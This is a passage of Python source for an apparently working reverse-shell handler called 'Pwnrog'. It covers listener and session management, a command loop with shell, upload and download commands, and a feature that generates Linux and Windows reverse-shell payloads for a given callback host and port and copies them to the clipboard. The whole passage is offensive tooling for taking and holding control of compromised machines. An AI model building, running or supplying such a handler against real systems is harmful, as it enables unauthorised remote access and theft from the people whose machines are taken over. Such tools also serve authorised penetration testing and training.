            status = "Active" if listener.active else "Stopped"
            print(f"  {lid:<5} {listener.host:<18} {listener.port:<8} {status:<10}")
        print()

    def cmd_kill(self, args):
        """Kill listener or session"""
        if len(args) < 2:
            error("Usage: kill <listener|session> <id>")
            return

        target_type = args[0].lower()
        try:
            target_id = int(args[1])
        except ValueError:
            error("Invalid ID")
            return

        if target_type == 'listener':
            if target_id in self.listeners:
                self.listeners[target_id].stop()
                del self.listeners[target_id]
                done(f"Killed listener {target_id}")
            else:
                error(f"Listener {target_id} not found")

        elif target_type == 'session':
            if target_id in self.sessions:
                self.sessions[target_id].close()
                if self.current_session and self.current_session.id == target_id:
                    self.current_session = None
                del self.sessions[target_id]
                done(f"Killed session {target_id}")
            else:
                error(f"Session {target_id} not found")
        else:
            error(f"Unknown target type: {target_type}")

    def cmd_killall(self, args):
        """Kill all listeners, sessions, or both"""
        if not args:
            # Kill everything with confirmation
            total = len(self.listeners) + len(self.sessions)
            if total == 0:
                warn("No listeners or sessions to kill")
                return
            
            warn(f"This will kill {len(self.listeners)} listener(s) and {len(self.sessions)} session(s)")
            try:
                confirm = input(f"{Colors.YELLOW}Are you sure? [y/N]: {Colors.RESET}").strip().lower()
            except (KeyboardInterrupt, EOFError):
                print()
                info("Cancelled")
                return
            
            if confirm != 'y':
                info("Cancelled")
                return
            
            # Kill all listeners
            for listener in self.listeners.values():
                listener.stop()
            listener_count = len(self.listeners)
            self.listeners.clear()
            
            # Kill all sessions
            for session in self.sessions.values():
                session.close()
            session_count = len(self.sessions)
            self.sessions.clear()
            self.current_session = None
            
            done(f"Killed {listener_count} listener(s) and {session_count} session(s)")
            return

        target_type = args[0].lower()

        if target_type == 'listener':
            count = len(self.listeners)
            for listener in self.listeners.values():
                listener.stop()
            self.listeners.clear()
            done(f"Killed {count} listener(s)")

        elif target_type == 'session':
            count = len(self.sessions)
            for session in self.sessions.values():
                session.close()
            self.sessions.clear()
            self.current_session = None
            done(f"Killed {count} session(s)")
        else:
            error(f"Unknown target type: {target_type}")

    def cmd_payloads(self, args):
        """List available payload types"""
        print(f"\n{Colors.BOLD}Available Payload Types:{Colors.RESET}")
        print(f"\n{Colors.GREEN}Linux:{Colors.RESET}")
        for t in PayloadGenerator.get_types('linux'):
            print(f"  - {t}")
        print(f"\n{Colors.GREEN}Windows:{Colors.RESET}")
        for t in PayloadGenerator.get_types('windows'):
            print(f"  - {t}")
        print()

    def cmd_payload(self, args):
        """Generate reverse shell payload"""
        # Parse arguments
        os_type = None
        payload_type = None
        lhost = self.lhost
        lport = self.lports[0] if self.lports else 1337
        
        for arg in args:
            if arg.startswith('os='):
                os_type = arg[3:]
            elif arg.startswith('type='):
                payload_type = arg[5:]
            elif arg.startswith('lhost='):
                lhost = arg[6:]
            elif arg.startswith('lport='):
                try:
                    lport = int(arg[6:])
                except ValueError:
                    error(f"Invalid port: {arg[6:]}")
                    return
        

        
        # Generate payload
        payload, used_os, used_type = PayloadGenerator.generate(lhost, lport, os_type, payload_type)
        
        if payload is None:
            if payload_type:
                error(f"Unknown payload type: {payload_type}")
                info("Use 'payloads' to see available types")
            else:
                error("Failed to generate payload")
            return
        
        # Display payload
        print(f"{Colors.CYAN}OS:{Colors.RESET} {used_os}")
        print(f"{Colors.CYAN}Type:{Colors.RESET} {used_type}")
        print(f"{Colors.CYAN}LHOST:{Colors.RESET} {lhost}")
        print(f"{Colors.CYAN}LPORT:{Colors.RESET} {lport}")
        print(f"\n{Colors.YELLOW}{payload}{Colors.RESET}\n")
        done("Payload generated")
        
        # Copy to clipboard
        if PayloadGenerator.copy_to_clipboard(payload):
            done("Payload copied to clipboard")
        else:
            warn("Could not copy to clipboard (xclip not found)")

    def run(self):
        """Run the interactive console"""
        Banner.show()

        self.start_listeners()

        while self.running:
            try:
                cmd_input = input(self.get_prompt()).strip()
                if not cmd_input:
                    continue

                # Use shlex to properly handle quoted arguments
                import shlex
                try:
                    parts = shlex.split(cmd_input)
                except ValueError:
                    parts = cmd_input.split()
                
                cmd = parts[0].lower()
                args = parts[1:]

                if cmd in ['exit', 'quit']:
                    info("Goodbye!")
                    self._save_history()
                    for listener in self.listeners.values():
                        listener.stop()
                    for session in self.sessions.values():
                        session.close()
                    break

                elif cmd == 'help':
                    self.cmd_help(args)
                elif cmd == 'sessions':
                    self.cmd_sessions(args)
                elif cmd == 'session':
                    self.cmd_session(args)
                elif cmd == 'shell':
                    self.cmd_shell(args)
                elif cmd == 'upgrade':
                    self.cmd_upgrade(args)
                elif cmd == 'download':
                    self.cmd_download(args)
                elif cmd == 'upload':
                    self.cmd_upload(args)
                elif cmd in ['background', 'bg']:
                    self.cmd_background(args)
                elif cmd == 'set':
                    self.cmd_set(args)
                elif cmd == 'listeners':
                    self.cmd_listeners(args)
                elif cmd == 'kill':
                    self.cmd_kill(args)
                elif cmd == 'killall':
                    self.cmd_killall(args)
                elif cmd == 'ls':
                    self.cmd_ls(args)
                elif cmd == 'pwd':
                    self.cmd_pwd(args)
                elif cmd == 'payload':
                    self.cmd_payload(args)
                elif cmd == 'payloads':
                    self.cmd_payloads(args)
                else:
                    error(f"Unknown command: {cmd}. Type 'help' for available commands.")

            except KeyboardInterrupt:
                print()
                if self.current_session:
                    info("Use 'background' or 'bg' to background session, 'exit' to quit")
                else:
                    info("Use 'exit' or 'quit' to exit")
            except EOFError:
                print()
                info("Goodbye!")
                self._save_history()
                for listener in self.listeners.values():
                    listener.stop()
                for session in self.sessions.values():
                    session.close()
                break
            except Exception as e:
                error(f"Error: {e}")


def main():
    parser = argparse.ArgumentParser(
        description='Pwnrog - Reverse Shell Handler',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument('-lh', '--lhost', default='0.0.0.0',
                        help='Listener IP address or interface (default: 0.0.0.0)')
    parser.add_argument('-lp', '--lport', default='1337',
                        help='Listener port(s), comma-separated (default: 1337)')
    parser.add_argument('-p', '--payload', action='store_true',
                        help='Generate a reverse shell payload')
    parser.add_argument('-os', '--os-type', choices=['linux', 'windows'],
                        help='OS type for payload (linux or windows)')
    parser.add_argument('-pt', '--payload-type',
                        help='Payload type (e.g. bash, python, powershell)')
    parser.add_argument('-pl', '--payloads', action='store_true',
                        help='List all available payload types')

    args = parser.parse_args()

    # Parse host
    lhost = args.lhost
    ip = get_interface_ip(lhost)
    if ip:
        lhost = ip

    # Parse ports
    try:
        lports = [int(p.strip()) for p in args.lport.split(',')]
    except ValueError:
        error("Invalid port number")
        sys.exit(1)

    # Handle -pl (list payloads)
    if args.payloads:
        print(f"\n{Colors.BOLD}Available Payload Types:{Colors.RESET}")
        print(f"\n{Colors.GREEN}Linux:{Colors.RESET}")
        for t in PayloadGenerator.get_types('linux'):
            print(f"  - {t}")
        print(f"\n{Colors.GREEN}Windows:{Colors.RESET}")
        for t in PayloadGenerator.get_types('windows'):
            print(f"  - {t}")
        print()
        sys.exit(0)

    # Handle -p (generate payload)
    if args.payload:
        # Check for multiple ports
        if len(lports) > 1:
            error("Cannot generate payload with multiple ports. Use a single port with -lp")
            sys.exit(1)
        
        lport = lports[0]
        
        # Generate payload
        payload, used_os, used_type = PayloadGenerator.generate(
            lhost, lport, args.os_type, args.payload_type
        )
        
        if payload is None:
            if args.payload_type:
                error(f"Unknown payload type: {args.payload_type}")
                info("Use -pl to see available types")
            else:
                error("Failed to generate payload")
            sys.exit(1)
        
        # Display payload
        print(f"{Colors.CYAN}OS:{Colors.RESET} {used_os}")
        print(f"{Colors.CYAN}Type:{Colors.RESET} {used_type}")
        print(f"{Colors.CYAN}LHOST:{Colors.RESET} {lhost}")
        print(f"{Colors.CYAN}LPORT:{Colors.RESET} {lport}")
        print(f"\n{Colors.YELLOW}{payload}{Colors.RESET}\n")
        done("Payload generated")
        
        # Copy to clipboard
        if PayloadGenerator.copy_to_clipboard(payload):
            done("Payload copied to clipboard")
        else:
            warn("Could not copy to clipboard (xclip not found)")
        
        sys.exit(0)

    # Run interactive console
    console = Console(lhost=lhost, lports=lports)
    console.run()


if __name__ == '__main__':
    main()
